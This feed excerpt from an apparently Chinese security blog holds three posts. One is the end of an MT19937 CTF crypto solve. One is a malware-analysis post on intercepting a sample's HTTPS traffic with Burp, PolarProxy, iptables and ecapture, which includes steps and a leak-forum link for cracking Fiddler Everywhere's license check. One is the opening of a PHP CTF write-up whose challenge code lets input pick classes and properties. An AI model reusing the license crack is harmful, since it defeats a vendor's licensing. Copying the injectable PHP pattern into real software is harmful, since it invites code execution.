class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits_xor</span>(<span class="params">bits, shift1, shift2</span>):</span></span><br><span class="line">old_bits = bits</span><br><span class="line">length = <span class="built_in">len</span>(bits)</span><br><span class="line">new_bits = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">new_bits = new_bits + <span class="built_in">str</span>(<span class="built_in">int</span>(old_bits[_]) ^ <span class="built_in">int</span>(old_bits[(_+shift1)%length]) ^ <span class="built_in">int</span>(old_bits[(_+shift2)%length]))</span><br><span class="line"><span class="keyword">return</span> new_bits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2l</span>(<span class="params">y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2r</span>(<span class="params">y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_cs2l</span>(<span class="params">y</span>):</span></span><br><span class="line">bits = <span class="built_in">bin</span>(y)[<span class="number">2</span>:]</span><br><span class="line">bit_len = <span class="built_in">len</span>(bits)</span><br><span class="line">bits32 = <span class="string">&quot;0&quot;</span> * (<span class="number">32</span> - bit_len) + bits</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">11</span>, <span class="number">15</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">22</span>, <span class="number">30</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">12</span>, <span class="number">28</span>)</span><br><span class="line">number = <span class="built_in">int</span>(bits32, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_cs2r</span>(<span class="params">y</span>):</span></span><br><span class="line">bits = <span class="built_in">bin</span>(y)[<span class="number">2</span>:]</span><br><span class="line">bit_len = <span class="built_in">len</span>(bits)</span><br><span class="line">bits32 = <span class="string">&quot;0&quot;</span> * (<span class="number">32</span> - bit_len) + bits</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">25</span>, <span class="number">13</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">18</span>, <span class="number">26</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">4</span>, <span class="number">20</span>)</span><br><span class="line">number = <span class="built_in">int</span>(bits32, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read().split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line">MT = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data:</span><br><span class="line">MT.append(reverse_cs2l(reverse_cs2r(<span class="built_in">int</span>(_))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">y = (MT[i] &amp; <span class="number">0x80000000</span>) + (MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">MT[i] = MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">MT[i] ^= <span class="number">2567483520</span></span><br><span class="line"></span><br><span class="line">y = MT[<span class="number">0</span>]</span><br><span class="line">y = y ^ cs2l(y, <span class="number">11</span>) ^ cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ cs2r(y, <span class="number">7</span>) ^ cs2r(y, <span class="number">19</span>)</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(y).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125;</span><br></pre></td></tr></table></figure><hr /><p>后面两题随缘更新</p><hr /><p>更个锤子，Crypto2 3想破头都没思路</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;老样子，赛后解题&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="MT19937" scheme="https://yoloyolo.top/tags/MT19937/"/>
    
  </entry>
  
  <entry>
    <title>恶意程序HTTPS解密</title>
    <link href="https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/"/>
    <id>https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/</id>
    <published>2022-05-14T23:54:29.000Z</published>
    <updated>2022-06-10T17:44:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>距离省考宣布寄了已经过去了两个月了<br />于是打了两个月的游戏，属实是打吐了<br />出来去原来的单位实习<br />上来就是分析病毒<br />在摸索的过程中产生了这篇文章</p><a id="more"></a><h1 id="0x00-wireshark"><a class="markdownIt-Anchor" href="#0x00-wireshark"></a> 0x00 Wireshark</h1><p>尝试抓包恶意软件</p><p>开启Wireshark，运行恶意程序，全是HTTPS的数据</p><p>看了下网上的资料可以设置环境变量<code>$SSLKEYLOGFILE</code>来设置SSL密钥临时文件的位置，然后在Wireshark里导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SSLKEYLOGFILE=/tmp/tls.log</span><br></pre></td></tr></table></figure><p>Edit→ Preferences → Protocols → TLS → (Pre-)Master-Secret log filename</p><p>选择环境变量<code>$SSLKEYLOGFILE</code>的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://www.baidu.com/</span><br></pre></td></tr></table></figure><p>即可<code>$SSLKEYLOGFILE</code>中看到HTTPS的密钥</p><p>Wireshark中也可以看到解密的HTTPS流量</p><p>但是运行恶意程序，恶意程序发起的HTTPS请求后并不会在<code>$SSLKEYLOGFILE</code>写入密钥</p><p>所以这个方法行不通</p><p>有想到过自己看TLS的密钥协商过程，写个脚本来计算出<strong>Master Secret Key</strong>，然后导入Wireshark来解密已保存的流量，但水平有限写不出来</p><p>好吧，正常情况</p><hr /><h1 id="0x01-burpsuite"><a class="markdownIt-Anchor" href="#0x01-burpsuite"></a> 0x01 Burpsuite</h1><p>将Burpsuite证书设置为系统证书（与<a href="https://yoloyolo.top/2021/08/01/Summary-For-Android-APP-Test/#%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6">这篇文章</a>类似）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">burpsuite&amp;</span><br><span class="line">curl -O http://127.0.0.1:8080/cert</span><br><span class="line">openssl x509 -inform DER -<span class="keyword">in</span> cert -out burp.crt</span><br><span class="line">mv burp.crt /usr/<span class="built_in">local</span>/share/ca-certificates/</span><br><span class="line">update-ca-certificates</span><br></pre></td></tr></table></figure><p>设置系统代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br></pre></td></tr></table></figure><p>命令行里的curl和python都能被抓到https的数据包</p><p>但是恶意软件的流量抓不到</p><p>使用proxychains代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;http 127.0.0.1 8080&quot;</span> &gt;&gt; /etc/proxychains.conf</span><br><span class="line">proxychain ./fritzfrog</span><br></pre></td></tr></table></figure><p>(配置文件<code>/etc/proxychains.conf</code>好像默认有一个socks4的代理？自己看着删掉吧)</p><p>但是恶意软件的流量还是抓不到</p><p>大概是这个恶意程序设置的是不走系统的代理吧，只能说开发人员有点水平</p><hr /><h1 id="0x02-fiddler-everywhere"><a class="markdownIt-Anchor" href="#0x02-fiddler-everywhere"></a> 0x02 Fiddler Everywhere</h1><p>想着在Fiddler上抓一下全局流量，结果Fiddler4在linux上面用不了，只能用mono运行一个老版本</p><p>还是用Fidder Everywhere吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.getfiddler.com/linux/fiddler-everywhere-3.2.0.AppImage</span><br><span class="line">chmod +x fiddler-everywhere-3.2.0.AppImage</span><br><span class="line">./fiddler-everywhere-3.2.0.AppImage</span><br></pre></td></tr></table></figure><p>注册，登录，“Your 30-day free trial has expired!”</p><p>看来是得破解一下了</p><p><a href="https://www.jianshu.com/p/5ce61cbae73a">AppImage格式操作说明</a></p><p>网上逛逛找到了个补丁</p><p><a href="https://leakforums.su/threads/fiddler-everywhere-3-2-0-cracked.138919/#post-311448">补丁下载</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fiddler-everywhere-3.2.0.AppImage --appimage-extract</span><br></pre></td></tr></table></figure><p><code>Fiddler.WebUi.dll</code>在<code>./squashfs-root/resources/app/out/WebServer/</code></p><p><code>main.3f983221e4e1aade.js</code>在<code>./squashfs-root/resources/app/out/WebServer/ClientApp/dist/</code></p><p>替换完成后进行打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/AppImage/AppImageKit/releases/download/13/appimagetool-x86_64.AppImage</span><br><span class="line">mv appimagetool-x86_64.AppImage appimagetool</span><br><span class="line">chmod +x appiamgetool</span><br><span class="line">mv appimagetool /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">ARCH=x86_64 appimagetool squashfs-root/</span><br><span class="line">./Fiddler_Everywhere-x86_64.AppImage</span><br></pre></td></tr></table></figure><p>卡在&quot;Please Wait&quot;界面，寄</p><p>根据这篇博客<a href="https://www.jysafe.cn/4785.air">[Linux]破解抓包软件FiddlerEverywhere 3.2.0 cracked</a>用dnspy改FiddlerBackendSDK.dll文件</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//raw</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AccountDTO <span class="title">GetBestAccount</span>(<span class="params">UserWithBestAccountDTO user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (user.BestEverywhereAccountId != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; x.Id == user.BestEverywhereAccountId.Value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//modified</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AccountDTO <span class="title">GetBestAccount</span>(<span class="params">UserWithBestAccountDTO user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成这样重打包dll，替换原dll后重打包appimage</p><p>运行后还是卡在&quot;Please Wait&quot;界面，寄</p><p>浪费了大半天的时间<del>混了大半天</del></p><hr /><h1 id="0x03-polarproxy"><a class="markdownIt-Anchor" href="#0x03-polarproxy"></a> 0x03 Polarproxy</h1><p>之前想着恶意程序既然能够绕过系统代理，那我把网卡的流量用iptables整个重定向到Burpsuite不就行了</p><p>但是实际上还是不行，自己大概思考了一下，这玩意估计把TCP握手的流量也丢给Burpsuite了，Burpsuite估计是处理不了TCP流量，然后就寄了（未验证）</p><p>混了大半天，突然脑子有个想法，google上搜了一下&quot;how to decrypt malware https traffic&quot;</p><p>然后第一个结果就介绍了PolarProxy这个工具，去官网看了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PolarProxy is a transparent SSL&#x2F;TLS proxy created for incident responders and malware researchers. PolarProxy is primarily designed to intercept and decrypt TLS encrypted traffic from malware. PolarProxy decrypts and re-encrypts TLS traffic, while also saving the decrypted traffic in a PCAP file that can be loaded into Wireshark or an intrusion detection system (IDS).</span><br></pre></td></tr></table></figure><p>看来自己是找对东西了</p><p>这玩意得单独用个用户运行，不然到时候iptables重定向会跟这玩意整个死循环出来</p><p>安装并启用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser --system --shell /bin/bash proxyuser</span><br><span class="line">sudo mkdir /var/<span class="built_in">log</span>/PolarProxy</span><br><span class="line">sudo chown proxyuser:root /var/<span class="built_in">log</span>/PolarProxy/</span><br><span class="line">sudo chmod 0775 /var/<span class="built_in">log</span>/PolarProxy/</span><br><span class="line">sudo su - proxyuser</span><br><span class="line">mkdir ~/PolarProxy</span><br><span class="line"><span class="built_in">cd</span> ~/PolarProxy/</span><br><span class="line">curl https://www.netresec.com/?download=PolarProxy | tar -xzf -</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sudo cp /home/proxyuser/PolarProxy/PolarProxy.service /etc/systemd/system/PolarProxy.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> PolarProxy.service</span><br><span class="line">sudo systemctl start PolarProxy.service</span><br></pre></td></tr></table></figure><p>配置系统证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/share/ca-certificates/extra</span><br><span class="line">sudo openssl x509 -inform DER -<span class="keyword">in</span> /var/<span class="built_in">log</span>/PolarProxy/polarproxy.cer -out /usr/share/ca-certificates/extra/PolarProxy-root-CA.crt</span><br><span class="line">sudo dpkg-reconfigure ca-certificates</span><br></pre></td></tr></table></figure><p>启用<code>extra /PolarProxy-root-CA.crt</code>即可</p><p>配置iptables</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -m owner --uid 0 -p tcp --dport 443 -j REDIRECT --to 10443</span><br><span class="line">iptables -t nat -A OUTPUT -m owner --uid 1000 -p tcp --dport 443 -j REDIRECT --to 10443</span><br></pre></td></tr></table></figure><p>运行恶意程序后在目录<code>/var/log/PolarProxy/</code>中可以看到程序捕获并解密的HTTPS流量</p><p>使用wireshark打开即可</p><p>普通用户运行恶意程序没啥反应，用root运行才抓到包</p><p>顺带一提，这个程序默认每天解密10GB的HTTPS的流量或10000次SESSION，但是够用了</p><hr /><h1 id="0x04-ecapture"><a class="markdownIt-Anchor" href="#0x04-ecapture"></a> 0x04 ecapture</h1><p><a href="https://github.com/ehids/ecapture">https://github.com/ehids/ecapture</a></p><p>看ebpf rootkit的时候看到了一个基于ebpf的monitor</p><p>能检测bash和解密https</p><p>解密的大概思路是hook一些ssl库，对于tls层可以直接获取http请求与响应</p><p>也就意味着这玩意甚至能免除用于MITM的CA</p><p>但是缺点也很明显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldd .&#x2F;apache2</span><br><span class="line"> not a dynamic executable</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;距离省考宣布寄了已经过去了两个月了&lt;br /&gt;
于是打了两个月的游戏，属实是打吐了&lt;br /&gt;
出来去原来的单位实习&lt;br /&gt;
上来就是分析病毒&lt;br /&gt;
在摸索的过程中产生了这篇文章&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
    <category term="HTTPS" scheme="https://yoloyolo.top/tags/HTTPS/"/>
    
    <category term="Traffic_Analysis" scheme="https://yoloyolo.top/tags/Traffic-Analysis/"/>
    
    <category term="Malware" scheme="https://yoloyolo.top/tags/Malware/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_APR_2022</title>
    <link href="https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/"/>
    <id>https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/</id>
    <published>2022-04-24T05:52:50.000Z</published>
    <updated>2022-04-25T08:01:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了<br />说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩<br />但是我上一次碰CTF还是去年的省赛…</p><a id="more"></a><h1 id="warmup-php"><a class="markdownIt-Anchor" href="#warmup-php"></a> warmup-php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line"><span class="variable">$object</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参数<code>action</code>用于输入类名<br />参数<code>properties</code>用于输入对象的属性<br />完事后会执行<code>$object-&gt;run()</code><br />函数<code>run()</code>在<code>ListView.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ListView</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tagName</span>=<span class="string">&#x27;div&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$template</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">ob_end_flush();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line"><span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">ob_clean();</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>run()</code> -&gt; <code>renderContent()</code> -&gt; <code>renderSection()</code><br />其中函数<code>renderSection()</code>为函数<code>renderContent()</code>中正则匹配替换的回调函数<br />用于匹配<code>&#123;\w+&#125;</code>的字符串，并将<code>\w+</code>拼接到&quot;render&quot;之后，再检验类中是否有这个函数，如果有则执行，没有则输出<code>&#123;\w+&#125;</code></p><p>再看<code>TestView.php</code>的内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line"><span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line"><span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowCssClassExpression!==<span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;dataProvider-&gt;data[<span class="variable">$row</span>];</span><br><span class="line"><span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowCssClassExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(is_array(<span class="keyword">$this</span>-&gt;rowCssClass) &amp;&amp; (<span class="variable">$n</span>=count(<span class="keyword">$this</span>-&gt;rowCssClass))&gt;<span class="number">0</span>)</span><br><span class="line"><span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;rowCssClass[<span class="variable">$row</span>%<span class="variable">$n</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$class</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]))</span><br><span class="line"><span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>].=<span class="string">&#x27; &#x27;</span>.<span class="variable">$class</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]=<span class="variable">$class</span>;</span><br><span 